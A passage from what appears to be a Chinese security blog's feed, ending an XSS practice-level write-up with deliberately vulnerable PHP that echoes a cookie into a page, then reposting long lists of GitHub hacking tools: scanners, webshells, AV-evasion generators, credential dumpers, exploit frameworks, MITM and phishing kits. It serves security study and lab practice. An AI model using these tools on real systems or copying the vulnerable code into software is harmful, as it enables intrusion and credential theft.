class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>和上一关一样，只不过就改UA </p>
<p>13</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>改cookie</p>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker_Tools-转</title>
    <url>/posts/ec585c99/</url>
    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>来源：<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>被动式注入检测工具： <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>高质量扫描Linux / FreeBSD Server中的任何漏洞：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>子域名扫描器：<br>Altdns-通过变更和排列发现子域：<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBrute使用开放式解析器作为一种代理来规避DNS速率限制：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2一个针对渗透测试者的快速子域暴力工具：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>本地网络扫描器（打开网页时扫描本地网络的PoC Javascript）：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiser基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-页面上的漏洞路由器：<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>防火墙检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>漏洞扫描程序，以最少的规则集在短时间内扫描大量目标：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>基于SQLMAP的主动和被动SQL注入的漏洞扫描工具： <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h1><p>社工收集工具：<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>信息扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>本地网络扫描仪：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>通过RDP扫描可访问性工具后门：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透测试工具：<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHub信息收集：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具（开膛手Johnny）:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>获取存储在本地计算机上大量的密码：<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMP暴力破解：<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
<h1 id="Web渗透（禁止用作违法）"><a href="#Web渗透（禁止用作违法）" class="headerlink" title="Web渗透（禁止用作违法）"></a>Web渗透（禁止用作违法）</h1><p>HTTP暴力破解，撞库攻击脚本：<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshell：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>免杀webshell无限生成工具：<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>渗透工具合集：<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-方便XSS与CSRF的工具：<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Web应用程序攻击和审核框架：<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>渗透测试包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>网络路径扫描仪：<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>代码注入检测工具： <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtils：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto Web服务器扫描仪：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>自动化的多合一OS命令注入和利用工具：<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscan测试：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windows安全工具套件：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apache实时日志分析器系统：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>检测网络入侵的特征，恶意蜘蛛（Malspider）：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>下一代网络扫描仪WhatWeb：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScan，WordPress漏洞扫描程序：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>【sqlmap】:<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTP代理服务器和一个SQLMAP API包装器):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web应用程序模糊器：<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
<h1 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，安全方案生成器（SecGen）：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulApps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Web突破演练平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoat旧版：<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
]]></content>
      <categories>
        <category>工具手册</category>
      </categories>
      <tags>
        <tag>工具手册</tag>
      </tags>
  </entry>
  <entry>
    <title>github渗透测试工具集-转</title>
    <url>/posts/a25c6c18/</url>
    <content><![CDATA[<p>转自: <a href="https://mp.weixin.qq.com/s?__biz=Mzg5NDMzNjYxOA==&amp;mid=2247487430&amp;idx=1&amp;sn=d1a0ecdbe455d068804d540c12d4070b&amp;source=41#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg5NDMzNjYxOA==&amp;mid=2247487430&amp;idx=1&amp;sn=d1a0ecdbe455d068804d540c12d4070b&amp;source=41#wechat_redirect</a></p>
<h1 id="漏洞练习平台"><a href="#漏洞练习平台" class="headerlink" title="漏洞练习平台"></a>漏洞练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a><br>webgoat-legacy漏洞练习平台:<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a><br>zvuldirll漏洞练习平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>vulapps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/RandomStorm/DVWA">https://github.com/RandomStorm/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>用node编写的漏洞练习平台，like OWASP NodeGoat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，生成含漏洞的虚拟机：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a></p>
<h1 id="花式扫描器"><a href="#花式扫描器" class="headerlink" title="花式扫描器"></a>花式扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>本地网络扫描器：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>子域名扫描器：<br><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br><a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br><a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>linux漏洞扫描：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>漏洞路由扫描器：<br><a href="https://github.com/jh00nbr/Routerhunter-2.0">https://github.com/jh00nbr/Routerhunter-2.0</a><br>迷你批量信息泄漏扫描脚本：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>Waf类型检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>服务器端口弱口令扫描器：<br><a href="https://github.com/wilson9x1/fenghuangscanner_v3">https://github.com/wilson9x1/fenghuangscanner_v3</a><br>Fox-scan扫描器：<br><a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a><br>信息搜集工具</p>
<h1 id="社工收集器："><a href="#社工收集器：" class="headerlink" title="社工收集器："></a>社工收集器：</h1><p><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>Github信息搜集：<br><a href="https://github.com/sea-god/gitscan">https://github.com/sea-god/gitscan</a><br>github Repo信息搜集工具：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a><br>信息探测及扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>内部网络信息扫描器：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>远程桌面登录扫描器：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透工具<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>SNMAP密码破解:<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>webshell大合集：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>渗透以及web攻击脚本：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>web渗透小工具大合集：<br><a href="https://github.com/rootphantomer/hacktoolsfor_me">https://github.com/rootphantomer/hacktoolsfor_me</a><br>XSS数据接收平台：<br><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a><br>XSS与CSRF工具：<br><a href="https://github.com/evilcos/xssor">https://github.com/evilcos/xssor</a><br>xss多功能扫描器：<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a><br>web漏洞扫描器:<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>WEB漏洞扫描器：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>渗透常用小工具包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>web目录扫描器:<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>web向命令注入检测工具：<br><a href="https://github.com/stasinopoulos/commix">https://github.com/stasinopoulos/commix</a><br>自动化SQL注入检查工具：<br><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>SSL扫描器：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>安全工具集合：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>apache日志分析器：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>php代码审计工具：<br><a href="https://github.com/pwnsdx/BadCode">https://github.com/pwnsdx/BadCode</a><br>web指纹识别扫描：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>检查网站恶意攻击：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>wordprees漏洞扫描器：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>固件漏洞扫描器：<br><a href="https://github.com/misterch0c/firminator_backend">https://github.com/misterch0c/firminator_backend</a><br>数据库注入工具<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>Web代理：<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>新版中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a><br>git泄露利用EXP：<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>浏览器攻击框架：<br><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a><br>自动化绕过WAF脚本：<br><a href="https://github.com/khalilbijjou/WAFNinja">https://github.com/khalilbijjou/WAFNinja</a><br><a href="https://github.com/owtf/wafbypasser">https://github.com/owtf/wafbypasser</a><br>一款开源WAF：<br><a href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a><br>http命令行客户端：<br><a href="https://github.com/jkbrzt/httpie">https://github.com/jkbrzt/httpie</a><br>浏览器调试利器：<br><a href="https://github.com/firebug/firebug">https://github.com/firebug/firebug</a><br>DISCUZ漏洞扫描器：<br><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a><br>自动化代码审计工具<br><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a><br>浏览器攻击框架：<br><a href="https://github.com/julienbedard/browsersploit">https://github.com/julienbedard/browsersploit</a><br>tomcat自动后门部署：<br><a href="https://github.com/mgeeky/tomcatWarDeployer">https://github.com/mgeeky/tomcatWarDeployer</a><br>网络空间指纹扫描器：<br><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a><br>burpsuit之J2EE扫描插件：<br><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a></p>
<h1 id="windows域渗透工具"><a href="#windows域渗透工具" class="headerlink" title="windows域渗透工具"></a>windows域渗透工具</h1><p>mimikatz明文注入：<br><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br>Powershell渗透库合集：<br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>Powershell tools合集：<br><a href="https://github.com/clymb3r/PowerShell">https://github.com/clymb3r/PowerShell</a><br>powershell的mimikittenz:<br><a href="https://github.com/putterpanda/mimikittenz">https://github.com/putterpanda/mimikittenz</a><br>域渗透教程:<br><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a></p>
<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web向Fuzz工具<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a><br>HTTP暴力破解，撞库攻击脚本<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a></p>
<h1 id="漏洞利用及攻击框架"><a href="#漏洞利用及攻击框架" class="headerlink" title="漏洞利用及攻击框架"></a>漏洞利用及攻击框架</h1><p>msf框架：<br><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a><br>pocsscan攻击框架：<br><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a><br>Pocsuite攻击框架:<br><a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a><br>Beebeeto攻击框架：<br><a href="https://github.com/n0tr00t/Beebeeto-framework">https://github.com/n0tr00t/Beebeeto-framework</a><br>漏洞POC&amp;EXP:<br>ExploitDB官方git版本:<br><a href="https://github.com/offensive-security/exploit-database">https://github.com/offensive-security/exploit-database</a><br>php漏洞代码分析：<br><a href="https://github.com/80vul/phpcodz">https://github.com/80vul/phpcodz</a><br>CVE-2016-2107:<br><a href="https://github.com/FiloSottile/CVE-2016-2107">https://github.com/FiloSottile/CVE-2016-2107</a><br>CVE-2015-7547 POC：<br><a href="https://github.com/fjserna/CVE-2015-7547">https://github.com/fjserna/CVE-2015-7547</a><br>JAVA反序列化POC生成工具:<br><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a><br>JAVA反序列化EXP:<br><a href="https://github.com/foxglovesec/JavaUnserializeExploits">https://github.com/foxglovesec/JavaUnserializeExploits</a><br>Jenkins CommonCollections EXP:<br><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit">https://github.com/CaledoniaProject/jenkins-cli-exploit</a><br>CVE-2015-2426 EXP (windows内核提权):<br><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a><br>use docker to show web attack(php本地文件包含结合phpinfo<br>getshell 以及ssrf结合curl的利用演示):<br><a href="https://github.com/hxer/vulnapp">https://github.com/hxer/vulnapp</a><br>php7缓存覆写漏洞Demo及相关工具:<br><a href="https://github.com/GoSecure/php7-opcache-override">https://github.com/GoSecure/php7-opcache-override</a><br>XcodeGhost木马样本:<br><a href="https://github.com/XcodeGhostSource/XcodeGhost">https://github.com/XcodeGhostSource/XcodeGhost</a></p>
<h1 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h1><p>中间人攻击框架:<br><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a><br><a href="https://github.com/secretsquirrel/BDFProxy">https://github.com/secretsquirrel/BDFProxy</a><br><a href="https://github.com/byt3bl33d3r/MITMf">https://github.com/byt3bl33d3r/MITMf</a><br>Inject code, jam wifi, and spy on wifi users:<br><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a><br>中间人代理工具:<br><a href="https://github.com/intrepidusgroup/mallory">https://github.com/intrepidusgroup/mallory</a><br>wifi钓鱼:<br><a href="https://github.com/sophron/wifiphisher">https://github.com/sophron/wifiphisher</a></p>
<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>本地存储的各类密码提取利器:<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
<h1 id="二进制及代码分析工具"><a href="#二进制及代码分析工具" class="headerlink" title="二进制及代码分析工具"></a>二进制及代码分析工具</h1><p>二进制分析工具<br><a href="https://github.com/devttys0/binwalk">https://github.com/devttys0/binwalk</a><br>系统扫描器<br><a href="https://github.com/quarkslab/binmap">https://github.com/quarkslab/binmap</a><br>rp:<br><a href="https://github.com/0vercl0k/rp">https://github.com/0vercl0k/rp</a><br>Windows Exploit Development工具<br><a href="https://github.com/lillypad/badger">https://github.com/lillypad/badger</a><br>二进制静态分析工具（python）:<br><a href="https://github.com/bdcht/amoco">https://github.com/bdcht/amoco</a><br>Python Exploit Development Assistance for GDB:<br><a href="https://github.com/longld/peda">https://github.com/longld/peda</a><br>对BillGates Linux Botnet系木马活动的监控工具<br><a href="https://github.com/ValdikSS/billgates-botnet-tracker">https://github.com/ValdikSS/billgates-botnet-tracker</a><br>木马配置参数提取工具:<br><a href="https://github.com/kevthehermit/RATDecoders">https://github.com/kevthehermit/RATDecoders</a><br>Shellphish编写的二进制分析工具（CTF向）:<br><a href="https://github.com/angr/angr">https://github.com/angr/angr</a><br>针对python的静态代码分析工具:<br><a href="https://github.com/yinwang0/pysonar2">https://github.com/yinwang0/pysonar2</a><br>一个自动化的脚本（shell）分析工具，用来给出警告和建议:<br><a href="https://github.com/koalaman/shellcheck">https://github.com/koalaman/shellcheck</a><br>基于AST变换的简易Javascript反混淆辅助工具:<br><a href="https://github.com/ChiChou/etacsufbo">https://github.com/ChiChou/etacsufbo</a></p>
<h1 id="EXP编写框架及工具"><a href="#EXP编写框架及工具" class="headerlink" title="EXP编写框架及工具"></a>EXP编写框架及工具</h1><p>二进制EXP编写工具:<br><a href="https://github.com/t00sh/rop-tool">https://github.com/t00sh/rop-tool</a><br>CTF Pwn 类题目脚本编写框架:<br><a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a><br>an easy-to-use io library for pwning development:<br><a href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a><br>跨平台注入工具:<br><a href="https://github.com/frida/frida">https://github.com/frida/frida</a><br>哈希长度扩展攻击EXP：<br><a href="https://github.com/citronneur/rdpy">https://github.com/citronneur/rdpy</a></p>
<h1 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h1><p>隐写检测工具<br><a href="https://github.com/abeluck/stegdetect">https://github.com/abeluck/stegdetect</a></p>
<h1 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料:"></a>各类安全资料:</h1><p>data_hacking合集:<br><a href="https://github.com/ClickSecurity/data_hacking">https://github.com/ClickSecurity/data_hacking</a><br>mobile-security-wiki:<br><a href="https://github.com/exploitprotocol/mobile-security-wiki">https://github.com/exploitprotocol/mobile-security-wiki</a><br>书籍《reverse-engineering-for-beginners》:<br><a href="https://github.com/veficos/reverse-engineering-for-beginners">https://github.com/veficos/reverse-engineering-for-beginners</a><br>一些信息安全标准及设备配置:<br><a href="https://github.com/luyg24/IT_security">https://github.com/luyg24/IT_security</a><br>APT相关笔记:<br><a href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a><br>Kcon资料:<br><a href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a><br>《DO NOT FUCK WITH A HACKER》:<br><a href="https://github.com/citypw/DNFWAH">https://github.com/citypw/DNFWAH</a><br>各类安全脑洞图：<br><a href="https://github.com/phith0n/Mind-Map">https://github.com/phith0n/Mind-Map</a><br>信息安全流程图：<br><a href="https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428">https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</a></p>
<h1 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h1><p>近年ctf writeup大全:<br><a href="https://github.com/ctfs/write-ups-2016">https://github.com/ctfs/write-ups-2016</a><br><a href="https://github.com/ctfs/write-ups-2015">https://github.com/ctfs/write-ups-2015</a><br><a href="https://github.com/ctfs/write-ups-2014">https://github.com/ctfs/write-ups-2014</a><br>fbctf竞赛平台Demo:<br><a href="https://github.com/facebook/fbctf">https://github.com/facebook/fbctf</a><br>ctf Resources:<br><a href="https://github.com/ctfs/resources">https://github.com/ctfs/resources</a><br>ctf及黑客资源合集:<br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources">https://github.com/bt3gl/My-Gray-Hacker-Resources</a><br>ctf和安全工具大合集:<br><a href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a><br>ctf向 python工具包<br><a href="https://github.com/P1kachu/v0lt">https://github.com/P1kachu/v0lt</a></p>
<h1 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源"></a>各类编程资源</h1><p> 大礼包（什么都有）:<br><a href="https://github.com/bayandin/awesome-awesomeness">https://github.com/bayandin/awesome-awesomeness</a><br>bash-handbook:<br><a href="https://github.com/denysdovhan/bash-handbook">https://github.com/denysdovhan/bash-handbook</a><br>python资源大全:<br><a href="https://github.com/jobbole/awesome-python-cn">https://github.com/jobbole/awesome-python-cn</a><br>git学习资料:<br><a href="https://github.com/xirong/my-git">https://github.com/xirong/my-git</a><br>安卓开源代码解析<br><a href="https://github.com/android-cn/android-open-project">https://github.com/android-cn/android-open-project</a><br>python框架，库，资源大合集:<br><a href="https://github.com/vinta/awesome-python">https://github.com/vinta/awesome-python</a><br>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:<br><a href="https://github.com/VerbalExpressions/JSVerbalExpressions">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p>
<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>python 正则表达式库（用于简化构造复杂的python正则表达式）:<br><a href="https://github.com/VerbalExpressions/">https://github.com/VerbalExpressions/</a><br>python任务管理以及命令执行库:<br><a href="https://github.com/pyinvoke/invoke">https://github.com/pyinvoke/invoke</a><br>python exe打包库:<br><a href="https://github.com/pyinstaller/pyinstaller">https://github.com/pyinstaller/pyinstaller</a><br>Veil-Evasion免杀项目：<br><a href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a><br>py3 爬虫框架:<br><a href="https://github.com/orf/cyborg">https://github.com/orf/cyborg</a><br>一个提供底层接口数据包编程和网络协议支持的python库:<br><a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a><br>python requests 库:<br><a href="https://github.com/kennethreitz/requests">https://github.com/kennethreitz/requests</a><br>python 实用工具合集:<br><a 